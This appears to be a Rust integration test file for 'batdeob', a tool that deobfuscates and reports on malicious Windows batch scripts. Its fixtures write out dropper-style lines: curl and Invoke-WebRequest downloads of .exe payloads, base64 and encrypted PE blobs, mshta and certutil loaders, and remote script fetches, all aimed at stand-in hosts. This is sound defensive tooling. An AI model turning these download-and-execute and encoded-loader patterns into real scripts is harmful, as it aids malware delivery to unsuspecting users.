#![allow(clippy::expect_used, clippy::unwrap_used)]

use assert_cmd::Command;
use std::fs;
use std::path::Path;
use tempfile::TempDir;

fn minimal_pe_bytes() -> Vec<u8> {
    let mut pe = vec![0u8; 2048];
    pe[0] = b'M';
    pe[1] = b'Z';
    pe[0x3c] = 0x80;
    pe[0x80] = b'P';
    pe[0x81] = b'E';
    pe[0x82] = 0;
    pe[0x83] = 0;
    pe[0x84] = 0x4c;
    pe[0x85] = 0x01;
    pe[0x86] = 0x03;
    pe[0x87] = 0;
    for (i, slot) in pe[512..].iter_mut().enumerate() {
        *slot = (i as u8).wrapping_mul(19).wrapping_add(11);
    }
    pe
}

#[test]
fn deob_writes_deobfuscated_file() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "set X=hi\r\necho %X%\r\n").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();
    let deob = out_dir.join("deobfuscated.bat");
    assert!(deob.exists(), "deobfuscated.bat not produced");
    let contents = fs::read_to_string(&deob).expect("read");
    assert!(contents.contains("echo hi"), "got:\n{}", contents);
}

#[test]
fn deob_force_overwrites_existing_report_files() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo first\r\n").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    fs::write(&input, "echo second\r\n").expect("rewrite");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--force",
        ])
        .assert()
        .success();

    let contents = fs::read_to_string(out_dir.join("deobfuscated.bat")).expect("read");
    assert!(
        contents.contains("echo second") && !contents.contains("echo first"),
        "stale deobfuscated output after --force:\n{}",
        contents
    );
}

#[test]
fn deob_force_removes_stale_generated_artifacts() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo first\r\n").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    fs::write(out_dir.join("0123456789.exe"), b"stale pe").expect("write stale exe");
    fs::write(out_dir.join("0123456789.meta"), b"stale meta").expect("write stale meta");
    fs::write(out_dir.join("analyst-notes.txt"), b"keep").expect("write analyst note");

    fs::write(&input, "echo second\r\n").expect("rewrite");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--force",
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    assert!(
        !entries
            .iter()
            .any(|name| name.ends_with(".exe") || name.ends_with(".meta")),
        "stale generated artifact remained after --force: {:?}",
        entries
    );
    assert!(
        entries.iter().any(|name| name == "analyst-notes.txt"),
        "unrelated analyst note was removed by --force: {:?}",
        entries
    );
}

#[cfg(unix)]
#[test]
fn deob_force_removes_output_symlink_without_following_it() {
    use std::os::unix::fs::symlink;

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo replacement\r\n").expect("write input");
    let out_dir = dir.path().join("out");
    fs::create_dir(&out_dir).expect("mkdir out");
    let outside = dir.path().join("outside.txt");
    fs::write(&outside, "do not overwrite").expect("write outside");
    symlink(&outside, out_dir.join("deobfuscated.bat")).expect("symlink");

    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--force",
        ])
        .assert()
        .success();

    let outside_contents = fs::read_to_string(&outside).expect("read outside");
    assert_eq!(outside_contents, "do not overwrite");
    let output_contents =
        fs::read_to_string(out_dir.join("deobfuscated.bat")).expect("read generated output");
    assert!(
        output_contents.contains("echo replacement"),
        "unexpected generated output: {output_contents}"
    );
}

#[test]
fn deob_force_refuses_generated_output_directory_collision() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo hi\r\n").expect("write");
    let out_dir = dir.path().join("out");
    fs::create_dir_all(out_dir.join("0123456789.exe")).expect("mkdir generated collision");

    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--force",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains(
            "refusing to remove generated output directory",
        ));
}

#[test]
fn deob_writes_extracted_child_bat() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, r#"cmd /c "echo hi""#).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    let has_child_bat = entries
        .iter()
        .any(|n| n.ends_with(".bat") && n != "deobfuscated.bat");
    assert!(has_child_bat, "no child .bat in {:?}", entries);
}

#[test]
fn deob_writes_traits_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo hi").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let traits_path = out_dir.join("traits.json");
    assert!(traits_path.exists(), "traits.json missing");
    let contents = fs::read_to_string(&traits_path).expect("read");
    // Should parse as JSON array (possibly empty)
    let _: serde_json::Value = serde_json::from_str(&contents).expect("valid json");
}

#[test]
fn report_traits_render_printable_echo_content_as_string() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "echo CreateObject(WScript.Shell).Run calc.exe>stage.vbs\r\n",
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid json");
    let content = v["traits"]
        .as_array()
        .expect("traits")
        .iter()
        .find(|trait_| trait_["kind"] == "EchoRedirect")
        .and_then(|trait_| trait_["content"].as_str());
    assert_eq!(
        content,
        Some("CreateObject(WScript.Shell).Run calc.exe\r\n"),
        "printable EchoRedirect content should render as a string: {v}"
    );
}

#[test]
fn deob_json_lists_written_recovered_artifact() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("looks-like-pdf.bat");
    fs::write(&input, minimal_pe_bytes()).expect("write pe");
    let out_dir = dir.path().join("out");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--json",
            "--force",
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let value: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
    let recovered = value["output_files"]["recovered"]
        .as_array()
        .expect("recovered output_files array");
    assert_eq!(recovered.len(), 1, "json:\n{value:#}");
    let artifact = &recovered[0];
    assert_eq!(artifact["kind"], "pe");
    assert_eq!(artifact["format"], "exe");
    assert_eq!(artifact["origin"], "disguised-pe-input");
    let path = artifact["path"].as_str().expect("artifact path");
    assert!(
        Path::new(path).exists(),
        "manifest path does not exist: {path}; json:\n{value:#}"
    );
    assert_eq!(fs::read(path).expect("read artifact")[..2], *b"MZ");
    assert!(
        artifact["meta_path"]
            .as_str()
            .is_some_and(|path| Path::new(path).exists()),
        "meta path missing or absent: {artifact:#}"
    );
}

#[test]
fn report_counts_non_pe_recovered_artifact_by_format() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("carrier-cab.bat");
    fs::write(&input, b"MSCF\x00\x00\x00\x00fake-cab").expect("write cab");
    let out_dir = dir.path().join("out");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "report",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
            "--force",
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let value: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
    assert_eq!(value["recovered"]["total"].as_u64(), Some(1), "{value:#}");
    assert_eq!(value["recovered"]["pe"].as_u64(), Some(0), "{value:#}");
    assert_eq!(
        value["recovered"]["by_format"]["cab"].as_u64(),
        Some(1),
        "{value:#}"
    );
    let recovered = value["output_files"]["recovered"]
        .as_array()
        .expect("recovered output_files array");
    assert_eq!(recovered.len(), 1, "json:\n{value:#}");
    assert_eq!(recovered[0]["kind"], "cab");
    assert_eq!(recovered[0]["format"], "cab");
}

#[test]
fn deob_writes_recovered_pe_blob_and_meta_file() {
    use aes::cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit};
    use base64::Engine;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Write;

    type Aes256CbcEnc = cbc::Encryptor<aes::Aes256>;

    let key: [u8; 32] = *b"01234567890123456789012345678901";
    let iv: [u8; 16] = *b"abcdefghijklmnop";

    let mut pe = vec![0u8; 2048];
    pe[0] = b'M';
    pe[1] = b'Z';
    pe[0x3c] = 0x40;
    pe[0x40] = b'P';
    pe[0x41] = b'E';
    pe[0x56] = 0x02;
    for (i, slot) in pe[256..].iter_mut().enumerate() {
        *slot = (i as u8).wrapping_mul(31).wrapping_add(7);
    }

    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    gz.write_all(&pe).expect("gz write");
    let gzipped = gz.finish().expect("gz finish");

    let mut ct = vec![0u8; gzipped.len() + 16];
    let ct_len = Aes256CbcEnc::new(&key.into(), &iv.into())
        .encrypt_padded_b2b_mut::<Pkcs7>(&gzipped, &mut ct)
        .expect("encrypt")
        .len();
    ct.truncate(ct_len);

    let ct_b64 = base64::engine::general_purpose::STANDARD.encode(&ct);
    let key_b64 = base64::engine::general_purpose::STANDARD.encode(key);
    let iv_b64 = base64::engine::general_purpose::STANDARD.encode(iv);

    let script = format!(
        "@echo off\r\n\
         set \"EtnCTS=$a.Key=[System.Convert]::FromBase64String('{key_b64}');\
         $a.IV=[System.Convert]::FromBase64String('{iv_b64}');\"\r\n\
         :: {ct_b64}\r\n"
    );

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, &script).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    let exe = entries.iter().find(|n| n.ends_with(".exe"));
    let meta = entries.iter().find(|n| n.ends_with(".meta"));
    assert!(
        exe.is_some(),
        "no recovered .exe in out-dir; got {:?}",
        entries
    );
    assert!(
        meta.is_some(),
        "no .meta companion in out-dir; got {:?}",
        entries
    );

    let exe_bytes = fs::read(out_dir.join(exe.unwrap())).expect("read exe");
    assert_eq!(&exe_bytes[..2], b"MZ");
    let meta_text = fs::read_to_string(out_dir.join(meta.unwrap())).expect("read meta");
    assert!(
        meta_text.contains("origin:") && meta_text.contains("size:"),
        ".meta missing fields:\n{meta_text}"
    );
}

#[test]
fn deob_writes_extracted_ps1() {
    use base64::Engine;
    let payload = "Write-Host hi";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    let has_ps1 = entries.iter().any(|n| n.ends_with(".ps1"));
    assert!(has_ps1, "no .ps1 in {:?}", entries);
}

#[test]
fn deob_writes_extracted_jscript() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"mshta javascript:var u="https://js-payload.example/a.js";close()"#,
    )
    .expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let extracted = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .find(|e| e.file_name().to_string_lossy().ends_with(".js"))
        .expect("extracted .js missing");
    let contents = fs::read_to_string(extracted.path()).expect("read extracted js");
    assert!(
        contents.contains("https://js-payload.example/a.js"),
        "got:\n{}",
        contents
    );
}

#[test]
fn deob_writes_extracted_vbs() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"mshta vbscript:CreateObject("WScript.Shell").Run("calc.exe"):close"#,
    )
    .expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let extracted = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .find(|e| e.file_name().to_string_lossy().ends_with(".vbs"))
        .expect("extracted .vbs missing");
    let contents = fs::read_to_string(extracted.path()).expect("read extracted vbs");
    assert!(
        contents.contains("CreateObject") && contents.contains("calc.exe"),
        "got:\n{}",
        contents
    );
}

#[test]
fn deob_writes_same_bytes_extracted_jscript_and_vbs() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "mshta javascript:shared_payload\r\nmshta vbscript:shared_payload\r\n",
    )
    .expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    assert!(
        entries.iter().any(|name| name.ends_with(".js")),
        "same-bytes JScript artifact missing: {entries:?}"
    );
    assert!(
        entries.iter().any(|name| name.ends_with(".vbs")),
        "same-bytes VBScript artifact missing: {entries:?}"
    );
}

#[test]
fn deob_writes_normalized_ps1_when_readability_improves() {
    use base64::Engine;
    let decoded = "Invoke-WebRequest -Uri 'https://readable.example/payload.exe'";
    let decoded_b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
    let payload = format!(
        "iex ([System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('{decoded_b64}')))"
    );
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let normalized = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .find(|e| e.file_name().to_string_lossy().ends_with(".normalized.ps1"))
        .expect("normalized ps1 missing");
    let contents = fs::read_to_string(normalized.path()).expect("read normalized ps1");
    assert!(
        contents.contains("https://readable.example/payload.exe"),
        "got:\n{}",
        contents
    );
}

#[test]
fn analyze_emits_json_to_stdout() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo plain\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    assert!(s.contains("\"deobfuscated\""), "stdout:\n{}", s);
}

#[test]
fn report_default_omits_raw_text_includes_full_traits() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl -o out.exe http://x.example.com/y.exe\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    // Full typed trait list lands in `traits`; analyst-friendly downloads
    // still in `downloads`; sha256 is computed.
    assert!(s.contains("\"traits\""), "stdout:\n{}", s);
    assert!(s.contains("\"downloads\""), "stdout:\n{}", s);
    assert!(s.contains("\"input_sha256\""), "stdout:\n{}", s);
    assert!(s.contains("x.example.com/y.exe"), "url missing: {}", s);
    // Source and deob are off by default.
    assert!(!s.contains("\"source\""), "default included source: {}", s);
    assert!(
        !s.contains("\"deobfuscated\""),
        "default included deob: {}",
        s
    );
}

#[test]
fn report_include_source_and_deob_inlines_both() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "set X=marker_XYZ\r\necho %X%\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "report",
            "--include-source",
            "--include-deob",
            input.to_str().expect("path"),
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    assert!(s.contains("\"source\""), "source missing");
    assert!(s.contains("\"deobfuscated\""), "deobfuscated missing");
    assert!(
        !s.contains("\"deobfuscated_preview\""),
        "preview duplicates deobfuscated output: {s}"
    );
    // Source verbatim (json-escaped).
    assert!(s.contains("marker_XYZ"), "marker missing from source/deob");
}

#[test]
fn report_include_deob_exposes_extracted_powershell_without_polluting_deob() {
    use base64::Engine;

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    let payload = "InVoKe-WebReQuEsT -UrI https://report-extracted.example/p";
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
    fs::write(
        &input,
        format!(
            "@echo off\r\npowershell -Command \"$x='{encoded}'; $y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x)); Invoke-Expression $y\"\r\n"
        ),
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", "--include-deob", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let s = String::from_utf8_lossy(&out.stdout);
    let v: serde_json::Value = serde_json::from_str(&s).expect("valid json");
    let deob = v["deobfuscated"].as_str().expect("deobfuscated");
    assert!(
        !deob.contains("==== batdeob: extracted") && !deob.contains("report-extracted.example"),
        "extracted PowerShell polluted parent deob: {deob}"
    );
    let normalized = v["extracted_payloads"]["powershell_normalized"]
        .as_array()
        .expect("powershell_normalized payload array");
    assert!(
        normalized.iter().any(|payload| payload
            .as_str()
            .unwrap_or("")
            .contains("report-extracted.example")),
        "normalized extracted PowerShell missing from separated payload buffers: {v}"
    );
    assert!(
        v["downloads"]
            .as_array()
            .expect("downloads")
            .iter()
            .any(|download| download["src"]
                .as_str()
                .unwrap_or("")
                .contains("report-extracted.example")),
        "download trait from extracted PowerShell was not reported: {v}"
    );
}

#[test]
fn report_extracted_powershell_payloads_render_known_batch_variables() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"set "cmdUrl=https://report-var-ps.example/startupppp.bat"
set "cmdDestination=C:\Users\Public\startupppp.bat"
powershell -Command "& { Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%' }"
"#,
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", "--include-deob", input.to_str().expect("path")])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
    let powershell = v["extracted_payloads"]["powershell"]
        .as_array()
        .expect("powershell payload array")
        .iter()
        .map(|value| value.as_str().unwrap_or_default())
        .collect::<Vec<_>>();

    assert!(
        powershell
            .iter()
            .any(|payload| payload.contains("https://report-var-ps.example/startupppp.bat")),
        "resolved PowerShell payload missing from report: {v}"
    );
    assert!(
        !powershell
            .iter()
            .any(|payload| payload.contains("%cmdUrl%") || payload.contains("%cmdDestination%")),
        "unresolved batch variables leaked into report payloads: {v}"
    );
}

#[test]
fn report_extracted_powershell_payloads_drop_empty_outfile_duplicate() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"set "cmdUrl=https://report-var-ps.example/startup.bat"
set "cmdDestination=C:\Users\Public\startup.bat"
powershell -Command "& { Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%' }"
powershell -Command "& { Invoke-WebRequest -Uri 'https://report-var-ps.example/startup.bat' -OutFile '' }"
"#,
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", "--include-deob", input.to_str().expect("path")])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
    let powershell = v["extracted_payloads"]["powershell"]
        .as_array()
        .expect("powershell payload array")
        .iter()
        .map(|value| value.as_str().unwrap_or_default())
        .collect::<Vec<_>>();

    assert!(
        powershell
            .iter()
            .any(|payload| payload.contains("-OutFile 'C:\\Users\\Public\\startup.bat'")),
        "resolved PowerShell payload missing from report: {v}"
    );
    assert!(
        !powershell
            .iter()
            .any(|payload| payload.contains("-OutFile ''")),
        "empty duplicate PowerShell payload leaked into report: {v}"
    );
}

#[test]
fn report_extracted_powershell_payloads_drop_empty_expand_archive_preview() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"powershell -Command "try { Expand-Archive -Path '' -DestinationPath '' -Force } catch { exit 1 }"
"#,
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", "--include-deob", input.to_str().expect("path")])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
    let powershell = v["extracted_payloads"]["powershell"]
        .as_array()
        .expect("powershell payload array");

    assert!(
        powershell.is_empty(),
        "empty Expand-Archive preview leaked into report: {v}"
    );
}

#[test]
fn report_extracted_payloads_render_known_cmd_and_delayed_variables() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"setlocal enabledelayedexpansion
set "StagePath=%TEMP%\stage.ps1"
set "MsiPath=%TEMP%\stage.bmp"
cmd /c msiexec /i "%MsiPath%"
powershell -Command "Set-Content -Path \"!StagePath!\" -Value ok"
"#,
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", "--include-deob", input.to_str().expect("path")])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
    let cmd = v["extracted_payloads"]["cmd"]
        .as_array()
        .expect("cmd payload array")
        .iter()
        .map(|value| value.as_str().unwrap_or_default())
        .collect::<Vec<_>>();
    let powershell = v["extracted_payloads"]["powershell"]
        .as_array()
        .expect("powershell payload array")
        .iter()
        .map(|value| value.as_str().unwrap_or_default())
        .collect::<Vec<_>>();

    assert!(
        cmd.iter().any(|payload| payload
            .contains(r#"msiexec /i "C:\Users\puncher\AppData\Local\Temp\stage.bmp""#)),
        "resolved cmd payload missing from report: {v}"
    );
    assert!(
        powershell.iter().any(|payload| payload
            .contains(r#"Set-Content -Path \"C:\Users\puncher\AppData\Local\Temp\stage.ps1\""#)),
        "resolved delayed PowerShell payload missing from report: {v}"
    );
    assert!(
        !cmd.iter().any(|payload| payload.contains("%MsiPath%"))
            && !powershell
                .iter()
                .any(|payload| payload.contains("!StagePath!")),
        "unresolved known variables leaked into report payloads: {v}"
    );
}

#[test]
fn report_extracted_cmd_payloads_render_adjacent_consumed_variables_from_deob_lines() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"@echo off
set "setter=set "
%setter%"Root=C:\Prog"
%setter%"Mid=ram"
%setter%"Tail=Data\"
cmd.exe /c %Root%%Mid%%Tail%sett.bat"
"#,
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", "--include-deob", input.to_str().expect("path")])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
    let cmd = v["extracted_payloads"]["cmd"]
        .as_array()
        .expect("cmd payload array")
        .iter()
        .map(|value| value.as_str().unwrap_or_default())
        .collect::<Vec<_>>();

    assert!(
        cmd.iter()
            .any(|payload| payload == &r#"C:\ProgramData\sett.bat""#),
        "resolved adjacent-variable cmd payload missing from report: {v}"
    );
    assert!(
        !cmd.iter()
            .any(|payload| payload.contains("%Root%") || payload.contains("%Mid%")),
        "unresolved adjacent variables leaked into report payloads: {v}"
    );
}

#[test]
fn report_summary_counts_certutil_decoded_jscript_payloads() {
    use base64::Engine;

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("certdecode-js.bat");
    let payload = r#"var CP7V="sc"+"r";GetObject(CP7V+"ipt:https://decoded-js.example/?1/");"#;
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
    fs::write(
        &input,
        format!("echo {encoded}>src.b64\r\ncertutil -decode src.b64 stage.Js\r\n"),
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", "--include-deob", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid json");
    assert_eq!(
        v["extracted"]["jscript"].as_u64(),
        Some(1),
        "report summary did not count decoded JScript payload: {v}"
    );
    assert!(
        v["extracted_payloads"]["jscript"]
            .as_array()
            .expect("jscript payload array")
            .iter()
            .any(|payload| payload
                .as_str()
                .unwrap_or("")
                .contains("decoded-js.example")),
        "decoded JScript payload missing from separated payload buffers: {v}"
    );
}

#[test]
fn report_timeout_emits_partial_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("slow-inline-ps.bat");
    let large_tail = "A".repeat(1_000_000);
    fs::write(
        &input,
        format!(
            "@echo off\r\npowershell -Command \"function sub($s,$i,$n){{ return $s.Substring($i,$n) }}; {large_tail}\"\r\n"
        ),
    )
    .expect("write");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "report",
            "--timeout",
            "1",
            "--include-deob",
            input.to_str().expect("path"),
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );

    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid timeout json");
    assert!(
        v["traits_capped"]
            .as_array()
            .expect("traits_capped")
            .iter()
            .any(|trait_| trait_["kind"] == "TimeoutHit"),
        "timeout report did not expose TimeoutHit: {v}"
    );
    assert!(
        v["deobfuscated"].as_str().is_some(),
        "timeout report did not include partial deobfuscated buffer: {v}"
    );
}

#[test]
fn analyze_jsonl_emits_lines() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl http://x/y\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .output()
        .expect("run");
    assert!(out.status.success());
    let s = String::from_utf8_lossy(&out.stdout);
    let lines: Vec<&str> = s.lines().collect();
    assert!(lines.len() >= 2, "expected >=2 lines, got: {:?}", lines);
    // Each line is valid JSON
    for line in &lines {
        let _: serde_json::Value = serde_json::from_str(line).expect("valid json line");
    }
    // First line is meta
    let first: serde_json::Value = serde_json::from_str(lines[0]).expect("first line");
    assert_eq!(first["kind"], "meta");
}

#[test]
fn summarize_emits_compact_report() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
